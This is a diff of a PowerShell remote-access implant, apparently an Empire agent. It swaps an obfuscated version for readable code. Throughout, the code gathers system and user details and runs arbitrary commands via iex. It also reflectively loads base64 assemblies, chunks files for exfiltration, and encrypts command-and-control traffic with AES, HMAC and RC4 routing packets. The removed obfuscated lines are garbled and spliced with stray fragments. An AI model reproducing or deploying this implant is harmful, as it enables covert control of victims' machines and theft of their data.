+    function Get-WorkingHours {
+        "agent working hours: $($script:WorkingHours)";
+    }
+    function Get-Sysinfo {
+        $str = '0|';
+        $str += $Script:ControlServers[$Script:ServerIndex];
+        $str += '|' + [Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;
+        $p = (Get-WmiObject Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);
+        $ip = @{$true=$p[0];$false=$p}[$p.Length -lt 6];
+        $str+="|$ip";
+        $str += '|' +(Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];
+        if(([Environment]::UserName).ToLower() -eq 'system') {
+            $str += '|True';
+        }
+        else{
+            $str += '|'+ ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator');
+        }
+        $n = [System.Diagnostics.Process]::GetCurrentProcess();
+        $str += '|'+$n.ProcessName+'|'+$n.Id;
+        $str += "|powershell|" + $PSVersionTable.PSVersion.Major;
+        $str += "|" + $env:PROCESSOR_ARCHITECTURE;
+        $str;
+    }
+    function Invoke-ShellCommand {
+        param($cmd, $cmdargs="")
+        if ($cmdargs -like "*`"\\*") {
+            $cmdargs = $cmdargs -replace "`"\\","FileSystem::`"\";
+        }
+        elseif ($cmdargs -like "*\\*") {
+            $cmdargs = $cmdargs -replace "\\\\","FileSystem::\\";
+        }
+        $output = '';
+        if ($cmd.ToLower() -eq 'shell') {
+            if ($cmdargs.length -eq '') { $output = 'no shell command supplied' }
             else {
-                0dU{olDcONCjMsOlCjMeOUT} = [Console]::ELNOCjMUtELN;
-                0dU{STCjMRiNCjMgwCjMRiteR} = &(6hdNew-6hd+6hdOb6hd+6hdje6hd+6hdct6hd) (6hdI6hd+6hdO.6hd+6hdStrin6hd+6hdgW6hd+6hdriter6hd);
-                [Console]::(6hdSet6hd+6hdOut6hd).Invoke(0dU{STrCjMiNGWrItCjMer});
-                0dU{OCjMUCjMTpUT} = &(6hdie6hd+6hdx6hd) ELN0dUcmdargsELN hmz &(6hdout6hd+6hd-strin6hd+6hdg6hd);
-                [Console]::(6hdSetO6hd+6hdut6hd).Invoke(0dU{OlDCCjMOnSOCjMLCjMeOCjMUt});
-                if','         0dU{oCjMUCjMTpUT} = (6hd[6hd+6hd!] 6hd+6hdErro6hd+6hdr:6hd+6hd 6hd+ELN0dU_ ELN+6hd(o6hd+6hdr 6hd+6hdcanno6hd+6hdt6hd+6hd 6hd+6hdb6hd+6hde 6hd+6hdacc6hd+6hde6hd+6hdssed).6hd);
+                $OldConsoleOut = [Console]::Out;
+                $StringWriter = New-Object IO.StringWriter;
+                [Console]::SetOut($StringWriter);
+                $output = iex "$cmdargs" | out-string;
+                [Console]::SetOut($OldConsoleOut);
+                if ($output.length -eq 0){
+                    $output = $StringWriter.ToString();
+                    }
+            }
+            $output += "`n`r";
+        }
+        elseif ($cmd.ToLower() -eq 'reflectiveload'){
+            if ($cmdargs.length -eq '') { $output = 'no binary supplied' };
+            else{
+                $assembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($cmdargs));
+                $output = "`n`r Reflective Load Complete";
+            }
+        }
+        else {
+            switch -regex ($cmd) {
+                '(ls|^dir)' {
+                    if ($cmdargs.length -eq "") {
+                        $output = Get-ChildItem -force | select mode,@{Name="Owner";Expression={(Get-Acl $_.FullName).Owner }},@{Name="LastWriteTime";Expression={($_.LastWriteTime.ToString("u"))}},length,name | ConvertTo-Json;
+                    }
+                    else {
+                        try{
+                            $output = IEX "$cmd $cmdargs -Force -ErrorAction Stop" | select mode,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }},@{Name="LastWriteTime";Expression={($_.LastWriteTime.ToString("u"))}},length,name | ConvertTo-Json;
+                        }
+                        catch [System.Management.Automation.ActionPreferenceStopException] {
+                            $output = "[!] Error: $_ (or cannot be accessed).";
                         }
                     }
                 }
-                ((6hd(mvl6hd+6hdd4m6hd+6hdoveld46hd+6hdc6hd+6hdop6hd+6hdyl6hd+6hdd6hd+6hd46hd+6hdcpld4r6hd+6hdmld4delld4r6hd+6hdmdi6hd+6hdrld4mkd6hd+6hdir6hd+6hd)6hd)  -crepLACe6hdld46hd,[ChAR]124) {
-                    if (0dU{cMDaCjMRCjMGs}.ELNleCjMNgThELN -ne ELNELN) {
+                '(mv|move|copy|cp|rm|del|rmdir|mkdir)' {
+                    if ($cmdargs.length -ne "") {
                         try {
-                            &(6hdIE6hd+6hdX6hd) (ELN0dUcmd ELN+ELN0dUcmdargs ELN+6hd-F6hd+6hdorce 6hd+6hd-6hd+6hdErro6hd+6hdrAction6hd+6hd 6hd+6hdSt6hd+6hdop6hd);
-                            0dU{oCjMUTpUT} = (6hdexecut6hd+6hde6hd+6hdd 6hd+ELN0dUcmd ELN+ELN0dUcmdargsELN);
-            ','hdfl6hd) hmz &(6hdOut-6hd+6hdStrin6hd+6hdg6hd);
-                0dU{JoCjMBrECjMSUlTID} = 0dU{scCjMRiPt:reSCjMULtiCjMds}[0dU{JobCjMNCjMAMe}];
-                0dU{PCjMACKeCjMTs} += 0dU(&(6hdEncode-Pa6hd+6hdc6hd+6hdk6hd+6hdet6hd) -type 110 -data 0dU(0dU{rECjMsUlCjMTS}) -ResultID 0dU{jOBReCjMSUltCjMID});
-                0dU{sCriPTCjM:rEsCjMULtICjMdS}.(6hdR6hd+6hde6hd+6hdmove6hd).Invoke(0dU{jCjMOCjMBNAMe});
+                            IEX "$cmd $cmdargs -Force -ErrorAction Stop";
+                            $output = "executed $cmd $cmdargs";
+                        }
+                        catch {
+                            $output=$_.Exception;
+                        }
+                    }
+                }
+                cd {
+                    if ($cmdargs.length -ne '')
+                    {
+                        $cmdargs = $cmdargs.trim("`"").trim("'");
+                        cd "$cmdargs";
+                        $output = pwd;
+                    }
+                }
+                '(ipconfig|ifconfig)' {
+                    $output = Get-WmiObject -class 'Win32_NetworkAdapterConfiguration' | ? {$_.IPEnabled -Match 'True'} | ForEach-Object {
+                        $out = New-Object psobject;
+                        $out | Add-Member Noteproperty 'Description' $_.Description;
+                        $out | Add-Member Noteproperty 'MACAddress' $_.MACAddress;
+                        $out | Add-Member Noteproperty 'DHCPEnabled' $_.DHCPEnabled;
+                        $out | Add-Member Noteproperty 'IPAddress' $($_.IPAddress -join ",");
+                        $out | Add-Member Noteproperty 'IPSubnet' $($_.IPSubnet -join ",");
+                        $out | Add-Member Noteproperty 'DefaultIPGateway' $($_.DefaultIPGateway -join ",");
+                        $out | Add-Member Noteproperty 'DNSServer' $($_.DNSServerSearchOrder -join ",");
+                        $out | Add-Member Noteproperty 'DNSHostName' $_.DNSHostName;
+                        $out | Add-Member Noteproperty 'DNSSuffix' $($_.DNSDomainSuffixSearchOrder -join ",");
+                        $out
+                    } | ConvertTo-Json;
+                }
+                '(ps|tasklist)' {
+                    $owners = @{};
+                    Get-WmiObject win32_process | ForEach-Object {
+                        try {
+                            $o = $_.getowner()
+                            if (-not $($o.User)) {
+                                $o = 'N/A'
+                            } else {
+                                $o = "$($o.Domain)\$($o.User)"
+                            }
+                        } catch {
+                            $o = 'N/A'
+                        }
+                        $owners[$_.handle] = $o
+                    }
+                    if($cmdargs -ne '') { $p = $cmdargs }
+                    else{ $p = "*" };
+                    $output = Get-Process $p | ForEach-Object {
+                        $arch = 'x64';
+                        if ([System.IntPtr]::Size -eq 4) {
+                            $arch = 'x86'
+                        }
+                        else{
+                            foreach($module in $_.modules) {
+                                if([System.IO.Path]::GetFileName($module.FileName).ToLower() -eq "wow64.dll") {
+                                    $arch = 'x86';
+                                    break
+                                }
+                            }
+                        }
+                        $out = New-Object psobject;
+                        $out | Add-Member Noteproperty 'ProcessName' $_.ProcessName;
+                        $out | Add-Member Noteproperty 'PID' $_.ID;
+                        $out | Add-Member Noteproperty 'Arch' $arch;
+                        $out | Add-Member Noteproperty 'UserName' $owners[$_.id.tostring()];
+                        $mem = "{0:N2} MB" -f $($_.WS/1MB);
+                        $out | Add-Member Noteproperty 'MemUsage' $mem;
+                        $out;
+                    } | Sort-Object -Property PID | ConvertTo-Json;
+                }
+                getpid { $output = [System.Diagnostics.Process]::GetCurrentProcess() }
+                route {
+                    if (($cmdargs.length -eq '') -or ($cmdargs.ToLower() -eq 'print')) {
+                        $adapters = @{};
+                        Get-WmiObject Win32_NetworkAdapterConfiguration | ForEach-Object { $adapters[[int]($_.InterfaceIndex)] = $_.IPAddress };
+                        $output = Get-WmiObject win32_IP4RouteTable | ForEach-Object {
+                            $out = New-Object psobject;
+                            $out | Add-Member Noteproperty 'Destination' $_.Destination;
+                            $out | Add-Member Noteproperty 'Netmask' $_.Mask;
+                            if ($_.NextHop -eq "0.0.0.0") {
+                                $out | Add-Member Noteproperty 'NextHop' 'On-link';
+                            }
+                            else{
+                                $out | Add-Member Noteproperty 'NextHop' $_.NextHop;
+                            }
+                            if($adapters[$_.InterfaceIndex] -and ($adapters[$_.InterfaceIndex] -ne "")) {
+                                $out | Add-Member Noteproperty 'Interface' $($adapters[$_.InterfaceIndex] -join ",");
+                            }
+                            else {
+                                $out | Add-Member Noteproperty 'Interface' '127.0.0.1';
+                            }
+                            $out | Add-Member Noteproperty 'Metric' $_.Metric1;
+                            $out;
+                        } | ConvertTo-Json;
+                    }
+                    else { $output = route $cmdargs };
+                }
+                '(whoami|getuid)' { $output = [Security.Principal.WindowsIdentity]::GetCurrent().Name };
+                hostname {
+                    $output = [System.Net.Dns]::GetHostByName(($env:computerName));
+                }
+                '(reboot|restart)' { Restart-Computer -force };
+                shutdown { Stop-Computer -force };
+                default {
+                    if ($cmdargs.length -eq '') { $output = IEX $cmd | Out-String }
+                    else { $output = IEX "$cmd $cmdargs" | Out-String };
+                }
             }
-            if (0dU{PACCjMKCjMeTs}) {
-                (& 0dU{seNdCjMMeCjMSCjMSAge} -Packets 0dU{PCjMACCjMkeTs});
-            }
-            if ((0dU{scCjMRiPCjMT:kiCjMLLdaTe}) -and ((&(6hdGe6hd+6hdt-Date6hd)) -gt 0dU{sCrCjMipTCjM:KCjMiLLdCjMAte})) {
-                0dU{MCjMSg} = (6hd[6hd+6hd!6hd+6hd] Agent 6hd)+0dU{ScCjMRCjMiPt:seSCjMSICjMOCjMNiD}+(6hd exi6hd+6hdting6hd+6hd: pa6hd+6hdst k6hd+6hdil6hd+6hdl6hd+6hddate6hd);
-            }
-            else {
-                0dU{MCjMsg} = (6hd[!6hd+6hd]6hd+6hd Agent 6hd)+0dU{SCrIPtCjM:CjMSESCjMSiOnid}+(6hd exiting: Los6hd+6hdt l6hd+6hdimit6hd+6hd 6hd+6hdr6hd+6hde6hd+6hdac6hd+6hdhe6hd+6hdd6hd);
-            }
-            (& 0dU{SendMECjMSCjMSACjMgE} -Packets 0dU(&(6hdE6hd+6hdnco6hd+6hdde-P6hd+6hdacket6hd) -type 2 -data 0dU{MCjMSg}));
-            exit;
         }
-        if (0dU{SCrIPtCjM:WCjMOCjMRCjMKICjMNGHOurs} -match 6hd^[0-9]{1,2}:[0-5][0-9]-[0-9]{1,2}:[0-5][0-9]0dU6hd) {
-            0dU{cCjMUCjMRrENt} = &(6hdGet-6hd+6hdDa6hd+6hdte6hd);
-            0dU{SCjMTCjMArT} = &(6hdG6hd+6hdet-Date6hd) (0d','  [string] 0dU{fCjMILE},
-            [int] 0dU{IndCjMeX} = 0,
-            0dU{CHUNCjMKsCjMIze} = 512KB,
-            [switch] 0dU{NOBCjMASECjM64}
+        "`n"+($output);
+    }
+    function Start-AgentJob {
+        param($ScriptString)
+        $RandName = -join("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()|Get-Random -Count 6);
+        $AppDomain = [AppDomain]::CreateDomain($RandName);
+        $PSHost = $AppDomain.Load([PSObject].Assembly.FullName).GetType('System.Management.Automation.PowerShell')::Create();
+        $null = $PSHost.AddScript($ScriptString);
+        $Buffer = New-Object 'System.Management.Automation.PSDataCollection[PSObject]';
+        $PSobjectCollectionType = [Type]'System.Management.Automation.PSDataCollection[PSObject]';
+        $BeginInvoke = ($PSHost.GetType().GetMethods() | ? { $_.Name -eq 'BeginInvoke' -and $_.GetParameters().Count -eq 2 }).MakeGenericMethod(@([PSObject], [PSObject]));
+        $Job = $BeginInvoke.Invoke($PSHost, @(($Buffer -as $PSobjectCollectionType), ($Buffer -as $PSobjectCollectionType)));
+        $Script:Jobs[$RandName] = @{'Alias'=$RandName; 'AppDomain'=$AppDomain; 'PSHost'=$PSHost; 'Job'=$Job; 'Buffer'=$Buffer};
+        $RandName;
+    }
+    function Get-AgentJobCompleted {
+        param($JobName)
+        if($Script:Jobs.ContainsKey($JobName)) {
+            $Script:Jobs[$JobName]['Job'].IsCompleted;
+        }
+    }
+    function Receive-AgentJob {
+        param($JobName)
+        if($Script:Jobs.ContainsKey($JobName)) {
+            $Script:Jobs[$JobName]['Buffer'].ReadAll();
+        }
+    }
+    function Stop-AgentJob {
+        param($JobName)
+        if($Script:Jobs.ContainsKey($JobName)) {
+            $Null = $Script:Jobs[$JobName]['PSHost'].Stop();
+            $Script:Jobs[$JobName]['Buffer'].ReadAll();
+            $Null = [AppDomain]::Unload($Script:Jobs[$JobName]['AppDomain']);
+            $Script:Jobs.Remove($JobName);
+        }
+    }
+    function Update-Profile {
+        param($Profile)
+        $ProfileParts = $Profile.split('|');
+        $script:TaskURIs = $ProfileParts[0].split(',');
+        $script:UserAgent = $ProfileParts[1];
+        $script:SessionID = $SessionID;
+        $script:Headers = @{};
+        if($ProfileParts[2]) {
+            $ProfileParts[2..$ProfileParts.length] | ForEach-Object {
+                $Parts = $_.Split(':');
+                $script:Headers.Add($Parts[0],$Parts[1]);
+            }
+        }
+        "Agent updated with profile $Profile";
+    }
+    function Get-FilePart {
+        Param(
+            [string] $File,
+            [int] $Index = 0,
+            $ChunkSize = 512KB,
+            [switch] $NoBase64
         )
         try {
-            0dU{F} = &(6hdGet-It6hd+6hde6hd+6hdm6hd) ELN0dUFileELN;
-            0dU{fCjMICjMLELEnGCjMTh} = 0dU{f}.ELNlCjMEnGthELN;
-            0dU{FRoCjMmCjMFiLE} = [io.file]::(6hdOp6hd+6hden6hd+6hdRead6hd).Invoke(0dU{FiCjMLe});
-            if (0dU{fiLElCjMeCjMNgCjMTH} -lt 0dU{CCjMhuCjMNCjMKsIzE}) {
-                if(0dU{ICjMNdCjMEx} -eq 0) {
-                    0dU{bUCjMFF} = &(6hdn6hd+6hdew-ob6hd+6hdject6hd) (6hdbyte6hd+6hd[]6hd) 0dU{fCjMICjMlEleNgCjMTH};
-                    0dU{coCjMUNT} = 0dU{FRoMCjMFCjMILe}.(6hdRe6hd+6hdad6hd).Invoke(0dU{bCjMUff}, 0, 0dU{buCjMFF}.ELNLenCjMgthELN);
-                    if(0dU{nCjMoBAseCjM64}) {
-                        0dU{BCjMUFF};
+            $f = Get-Item "$File";
+            $FileLength = $f.length;
+            $FromFile = [io.file]::OpenRead($File);
+            if ($FileLength -lt $ChunkSize) {
+                if($Index -eq 0) {
+                    $buff = new-object byte[] $FileLength;
+                    $count = $FromFile.Read($buff, 0, $buff.Length);
+                    if($NoBase64) {
+                        $buff;
                     }
                     else{
-                        [System.Convert]::ELNtCjMOBaSE64sTCjMRingELN(0dU{BCjMUfF});
+                        [System.Convert]::ToBase64String($buff);
                     }
                 }
                 else{
-                    0dU{nUCjMll};
+                    $Null;
                 }
             }
             else{
-                0dU{BUCjMFF} = &(6hdn6hd+6hdew-objec6hd+6hdt6hd) (6hdbyt6hd+6hde[]6hd) 0dU{CCjMhCjMUNKsiZe};
-                0dU{STCjMArt} = 0dU{iNCjMdeX} * 0dU(0dU{cHCjMUNksiCjMze});
-                0dU{nCjMULL} = 0dU{frOmfICjMLe}.(6hdSee6hd+6hdk6hd).Invoke(0dU{sCjMTaCjMRt},0);
-                0dU{COCjMUnt} = 0dU{fRoCjMmfCjMiLe}.(6hdRe6hd+6hdad6hd).Invoke(0dU{BUCjMFF}, 0, 0dU{BuCjMFf}.ELNlECjMNGtHELN);
-                if (0dU{COCjMUnT} -gt 0) {
-                    if(0dU{CCjMoCjMUnt} -ne 0dU{CCjMhunkCjMSIZe}) {
-                        0dU{BCjMUFF2} = &(6hdn6hd+6hdew6hd+6hd-o6hd+6hdbject6hd) (6hdby6hd+6hdte[6hd+6hd]6hd) 0dU{CoCjMUCjMNT};
-                        [array]::(6hdc6hd+6hdopy6hd).Invoke(0dU{bUCjMFF}, 0dU{BuCjMFf2}, 0dU{CCjMouCjMNT});
-                        if(0dU{NCjMobAsE64}) {
-                            0dU{BUFCjMF2}
+                $buff = new-object byte[] $ChunkSize;
+                $Start = $Index * $($ChunkSize);
+                $null = $FromFile.Seek($Start,0);
+                $count = $FromFile.Read($buff, 0, $buff.Length);
+                if ($count -gt 0) {
+                    if($count -ne $ChunkSize) {
+                        $buff2 = new-object byte[] $count;
+                        [array]::copy($buff, $buff2, $count);
+                        if($NoBase64) {
+                            $buff2
                         }
                         else{
-                            [System.Convert]::ELNtCjMoBCjMAsCjMe64CjMStringELN(0dU{bCjMUCjMFF2});
+                            [System.Convert]::ToBase64String($buff2);
                         }
                     }
                     else{
-                        if(0dU{NOBCjMASCjME64}) {
-                            0dU{bCjMUfF};
+                        if($NoBase64) {
+                            $buff;
                         }
                         else{
-                            [System.Convert]::ELNtObASE64SCjMTCjMRICjMNgELN(0dU{buCjMFf});
+                            [System.Convert]::ToBase64String($buff);
                         }
                     }
                 }
                 else{
-                    0dU{nCjMUlL};
+                    $Null;
                 }
             }
         }
         catch{}
         finally {
-            0dU{fRoCjMMCjMFiLE}.(6hdCl6hd+6hdose6hd).Invoke();
+            $FromFile.Close();
         }
     }
-    function eCjMNcCjMRYPCjMT-BYCjMTES {
-        param(0dU{BYtCjMes})
-        0dU{iCjMV} = [byte] 0..255 hmz &(6hdGe6hd+6hdt-R6hd+6hdand6hd+6hdom6hd) -count 16;
+    function Encrypt-Bytes {
+        param($bytes)
+        $IV = [byte] 0..255 | Get-Random -count 16;
         try {
-            0dU{aCjMES}=&(6hdNew-O6hd+6hdbj6hd+6hdect6hd) (6hdSystem.6hd+6hdSe6hd+6hdc6hd+6hdu6hd+6hdrity.Cryptog6hd+6hdrap6hd+6hdhy.A6hd+6hde6hd+6hds6hd+6hdCrypto6hd+6hdServic6hd+6hdeProv6hd+6hdide6hd+6hdr6hd);
+            $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
         }
         catch {
-            0dU{aCjMeS}=&(6hdNew6hd+6hd-O6hd+6hdbje6hd+6hdct6hd) (6hdSystem6hd+6hd.S6hd+6hde6hd+6hdcurity.C6hd+6hdryp6hd+6hdtograph6hd+6hdy6hd','elManaged6hd);
+            $AES=New-Object System.Security.Cryptography.RijndaelManaged;
+        }
+        $AES.Mode = "CBC";
+        $AES.Key = $Encoding.GetBytes($SessionKey);
+        $AES.IV = $IV;
+        $ciphertext = $IV + ($AES.CreateEncryptor()).TransformFinalBlock($bytes, 0, $bytes.Length);
+        $HMAC.Key = $Encoding.GetBytes($SessionKey);
+        $ciphertext + $hmac.ComputeHash($ciphertext)[0..9];
+    }
+    function Decrypt-Bytes {
+        param ($inBytes)
+        if($inBytes.Length -gt 32) {
+            $mac = $inBytes[-10..-1];
+            $inBytes = $inBytes[0..($inBytes.length - 11)];
+            $hmac.Key = $Encoding.GetBytes($SessionKey);
+            $expected = $hmac.ComputeHash($inBytes)[0..9];
+            if (@(Compare-Object $mac $expected -sync 0).Length -ne 0) {
+                return;
             }
-            0dU{ACjMEs}.ELNMCjModeELN = (6hdCB6hd+6hdC6hd);
-            0dU{aCjMES}.ELNkCjMEYELN = 0dU{eCjMNCOCjMdCjMiNG}.(6hdGet6hd+6hdBy6hd+6hdtes6hd).Invoke(0dU{seSsICjMoCjMNKCjMeY});
-            0dU{ACjMeS}.ELNICjMVELN = 0dU{IV};
-            (0dU{ACjMeS}.(6hdCre6hd+6hdateD6hd+6hdecryp6hd+6hdt6hd+6hdor6hd).Invoke()).ELNtRANCjMSfORmCjMFINalbCjMlCjMOCkELN((0dU{INCjMByCjMTeS}[16..0dU{inCjMBYCjMTES}.ELNlECjMNGThELN]), 0, 0dU{InCjMByCjMTES}.ELNlECjMNgThELN-16)
+            $IV = $inBytes[0..15];
+            try {
+                $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
+            }
+            catch {
+                $AES=New-Object System.Security.Cryptography.RijndaelManaged;
+            }
+            $AES.Mode = "CBC";
+            $AES.Key = $Encoding.GetBytes($SessionKey);
+            $AES.IV = $IV;
+            ($AES.CreateDecryptor()).TransformFinalBlock(($inBytes[16..$inBytes.length]), 0, $inBytes.Length-16)
         }
     }
-    function NEW-rOUCjMTiCjMNCjMGPACjMCKeT {
-        param(0dU{EnCDACjMTa}, 0dU{mCjMEta})
-        if(0dU{ECjMNcCjMData}) {
-            0dU{EncCjMDaTAlCjMEn} = 0dU{ECjMNcdaCjMTA}.ELNlCjMENCjMgTHELN;
+    function New-RoutingPacket {
+        param($EncData, $Meta)
+        if($EncData) {
+            $EncDataLen = $EncData.Length;
         }
         else {
-            0dU{EnCDCjMATCjMALEN} = 0;
+            $EncDataLen = 0;
         }
-        0dU{sCjMkB} = 0dU{enCjMCOdiCjMNg}.(6hdGe6hd+6hdtB6hd+6hdytes6hd).Invoke(0dU{SCjMTaGinGCjMKEy});
-        0dU{iCjMV}=[BitConverter]::(6hdGe6hd+6hdtBy6hd+6hdtes6hd).Invoke(0dU(&(6hdGet-Ra6hd+','       [String]
-        0dU{WOrkICjMNgCjMHCjMoUrS},
-        [object]
-        0dU{proxCjMYsCjMEttiNCjMGS},
-        [String]
-','            }
-                        catch {
-                            0dU{oCjMUCjMTpuT}=0dU{_}.ELNeCjMXCepTiCjMonELN;
-                        }
-                    }
-                }
-                (6hdcd6hd) {
-                    if (0dU{CMdCjMACjMRGs}.ELNlenCjMGCjMThELN -ne 6hd6hd)
-                    {
-                        0dU{cCjMMdarCjMgs} = 0dU{cMDCjMArCjMGS}.(6hdtri6hd+6hdm6hd).Invoke(ELNCjMELNELN).(6hdtri6hd+6hdm6hd).Invoke(ELN6hdELN);
-                        &(6hdcd6hd) ELN0dUcmdargsELN;
-                        0dU{OCjMUtCjMPut} = &(6hdpw6hd+6hdd6hd);
-                    }
-                }
-                ((6hd(ipcon6hd+6hdfig6hd+6hd{0}ifc6hd+6hdonfi6hd+6hdg)6hd) -f [cHaR]124) {
-                    0dU{OuCjMTPUt} = &(6hdGet-WmiO6hd+6hdb6hd+6hdj6hd+6hdect6hd) -class (6hdWin32_Networ6hd+6hdkAd6hd+6hdap6hd+6hdterCo6hd+6hdnfig6hd+6hduration6hd) hmz &(6hd?6hd) {0dU{_}.ELNiCjMpeNABlCjMedELN -Match (6hdTr6hd+6hdue6hd)} hmz &(6hdForE6hd+6hdach6hd+6hd-Object6hd) {
-                        0dU{oCjMUt} = &(6hdNew6hd+6hd-O6hd+6hdbject6hd) (6hdpso6hd+6hdbjec6hd+6hdt6hd);
-                        0dU{oCjMUT} hmz &(6hdA6hd+6hdd6hd+6hdd-Membe6hd+6hdr6hd) (6hdNo6hd+6hdteproper6hd+6hdt6hd+6hdy6hd) (6hdDesc6hd+6hdrip6hd+6hdtio6hd+6hdn6hd) 0dU{_}.ELNDECjMSCripTCjMIOnELN;
-                        0dU{oCjMUt} hmz &(6hdAdd6hd+6hd-Memb6hd+6hder6hd) (6hdNote6hd+6hdprope6hd+6hdrty6hd) (6hdMACAd6hd+6hddre6hd+6hdss6hd) 0dU{_}.ELNmacAddCjMRECjMsSELN;
-                        0dU{OCjMUT} hmz &(6hdAdd6hd+6hd-6hd+6hdMember6hd) (6hdNo6hd+6hdteproper6hd+6hdty6hd) (6hdDHC6hd+6hdPEnab6hd+6hdl6hd+6hded6hd) 0dU{_}.ELNDhCjMcCjMpENAbLCjMeDELN;
-                        0dU{oCjMUT} hmz &(6hdAdd6hd+6hd-Me6hd+6hdmbe6hd+6hdr6hd) (6hdNote6hd+6hdpr6hd+6hdop6hd+6hderty6hd) (6hdIPAdd6hd+6hdres6hd+6hds6hd) 0dU(0dU{_}.ELNIpaddCjMRCjMEssELN -join ELN,ELN);
-                        0dU{oCjMUt} hmz &(6hdA6hd+6hddd6hd+6hd-Member6hd) (6hdN6hd+6hdote6hd+6hdpropert6hd+6hdy6hd) (6hdIPSu6hd+6hdbnet6hd) 0dU(0dU{_}.ELNIPCjMSuCjMBneTELN -join ELN,ELN);
-                        0dU{oCjMUT} hmz &(6hdAdd-M6hd+6hdem6hd+6hdbe6hd+6hdr6hd) (6hdNoteprop6hd+6hde6hd+6hdrt6hd+6hdy6hd) (6hdDefault6hd+6hdIPGa6hd+6hdteway6hd) 0dU(0dU{_}.ELNDEFAuCjMLTiCjMPgATeCjMwayELN -join ELN,ELN);
-                        0dU{oCjMUt} hmz &(6hdA6hd+6hddd-Membe6hd+6hdr6hd) (6hdNotepro6hd+6hdpe6hd+6hdr6hd+6hdty6hd) (6hdDNS6hd+6hdS6hd+6hderver6hd) 0dU(0dU{_}.ELNdnsCjMSerCjMVECjMRSeCjMARchoCjMRdErELN -join ELN,ELN);
-                        0dU{OCjMUT} hmz &(6hdAdd-Memb6hd+6hde6hd+6hdr6hd) (6hdNotep6hd+6hdr6hd+6hdoperty6hd) (6hdDN6hd+6hdSH6hd+6hdostNa6hd+6hdme6hd) 0dU{_}.ELNdnCjMshCjMOsTNaMEELN;
-                        0dU{oCjMUt} hmz &(6hdAdd-6hd+6hdMem6hd+6hdb6hd+6hder6hd) (6hdNotep6hd+6hdr6hd+6hdopert6hd+6hdy6hd) (6hdDN6hd+6hdSSuff6hd+6hdix6hd) 0dU(0dU{_}.ELNDnsdOmAInSuCjMFFCjMiCjMXseARCjMCHCjMORdeRELN -join ELN,ELN);
-                        0dU{OCjMUt}
-                    } hmz &(6hdConver6hd+6hdtTo6hd+6hd-6hd+6hdJ6hd+6hdson6hd);
-                }
-                ((6hd(6hd+6hdps6hd+6hdanTtask6hd+6hdlis6hd+6hdt)6hd)-CRepLaCE6hdanT6hd,[chaR]124) {
-                    0dU{ownCjMErs} = @{};
-                    &(6hdGet-WmiObje6hd+','
-        0dU{PCjMRCjMOfIle} = ((6hd/ta6hd+6hdrant6hd+6hdin6hd+6hdo/pulp6hd+6hdfic6hd+6hdtio6hd+6hdn,/6hd+6hdsc6hd+6hdor6hd+6hdce6hd+6hdse/killersofflow6hd+6hders,6hd+6hd/copola/6hd+6hdgod6hd+6hdf6hd+6hdath6hd+6hder{0}M6hd+6hdo6hd+6hdzi6hd+6hdl6','6hd+6hdt6hd+6hdes6hd).Invoke(0dU{StaGiNCjMgCjMkey});
-                0dU{RCjMoutCjMingCjMDATa} = &(6hdC6hd+6hdonve6hd+6hdrtTo6hd+6hd-Rc4By6hd+6hdt6hd+6hdeStre6hd+6hdam6hd) -In 0dU{roCjMUCjMTiNGECjMNcCjMdAta} -RCK 0dU(0dU{roUCjMTCjMiNgiv}+0dU{sCjMkb});
-                0dU{pACkeCjMTSCjMEssiCjMONID} = [System.Text.Encoding]::ELNUCjMTf8ELN.ELNgETSCjMTRICjMNGELN(0dU{RCjMOutINgDaCjMTa}[0..7]);
-                0dU{LaCjMNgCjMUAGE} = 0dU{RCjMoUTinCjMGDAta}[8];
-                0dU{mCjMeTa} = 0dU{rOCjMUCjMTICjMNGDatA}[9];
-                0dU{exCjMTRa} = 0dU{RCjMoCjMUTiNCjMGdata}[10..11];
-                0dU{PACCjMkECjMTLENGth} = [BitConverter]::(6hdToUInt36hd+6hd26hd).Invoke(0dU{rCjMOUtICjMNgCjMdATA}, 12);
-                if (0dU{PCjMACKCjMetlCjMeNGth} -lt 0) {
+        $SKB = $Encoding.GetBytes($StagingKey);
+        $IV=[BitConverter]::GetBytes($(Get-Random));
+        $Data = $Encoding.GetBytes($script:SessionID) + @(0x01,$Meta,0x00,0x00) + [BitConverter]::GetBytes($EncDataLen);
+        $RoutingPacketData = ConvertTo-Rc4ByteStream -In $Data -RCK $($IV+$SKB);
+        if($EncData) {
+            ($IV + $RoutingPacketData + $EncData);
+        }
+        else {
+            ($IV + $RoutingPacketData);
+        }
+    }
+    function Decode-RoutingPacket {
+        param($PacketData)
+        if ($PacketData.Length -ge 20) {
+            $Offset = 0;
+            while($Offset -lt $PacketData.Length) {
+                $RoutingPacket = $PacketData[($Offset+0)..($Offset+19)];
+                $RoutingIV = $RoutingPacket[0..3];
+                $RoutingEncData = $RoutingPacket[4..19];
+                $Offset += 20;
+                $SKB = $Encoding.GetBytes($StagingKey);
+                $RoutingData = ConvertTo-Rc4ByteStream -In $RoutingEncData -RCK $($RoutingIV+$SKB);
+                $PacketSessionID = [System.Text.Encoding]::UTF8.GetString($RoutingData[0..7]);
+                $Language = $RoutingData[8];
+                $Meta = $RoutingData[9];
+                $Extra = $RoutingData[10..11];
+                $PacketLength = [BitConverter]::ToUInt32($RoutingData, 12);
+                if ($PacketLength -lt 0) {
                     break;
                 }
-                if (0dU{PCjMAcKCjMeTCjMseSSionCjMID} -eq 0dU{sCRICjMpTCjM:sCjMESCjMsionCjMID}) {
-                    0dU{EnCDCjMATA} = 0dU{pCjMACjMcketCjMdATA}[0dU{OCjMFfsCjMet}..(0dU{oCjMFCjMFSET}+0dU{pCjMAcCjMKECjMTlCjMeNGtH}-1)];
-                    0dU{oFFCjMsCjMEt} += 0dU{PCjMACjMcKeTLCjMeNCjMgTH};
-                    &(6hdPro6hd+6hdc6hd+6hde6hd+6hdss-Tas6hd+6hdkingPa6hd+6hdckets6hd) 0dU{eCjMNcDaTA};
+                if ($PacketSessionID -eq $script:SessionID) {
+                    $EncData = $PacketData[$Offset..($Offset+$PacketLength-1)];
